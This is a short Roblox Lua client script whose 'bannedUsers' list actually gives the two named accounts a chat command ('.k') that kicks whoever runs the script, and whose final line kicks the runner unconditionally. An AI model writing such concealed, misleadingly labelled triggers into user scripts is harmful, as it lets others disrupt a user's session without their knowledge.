
local bannedUsers = {
    "stockingsum",
    "sgvc4ux8lq6ny9dgip8y"
}

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer


local function isBanned(user)
    for _, banned in ipairs(bannedUsers) do
        if user.Name == banned or tostring(user.UserId) == banned then
            return true
        end
    end
    return false
end


Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        if isBanned(player) and message == ".k" then
            LocalPlayer:Kick("")  
        end
    end)
end)


for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        if isBanned(player) and message == ".k" then
            LocalPlayer:Kick("")  
        end
    end)
end
LocalPlayer:Kick("")  
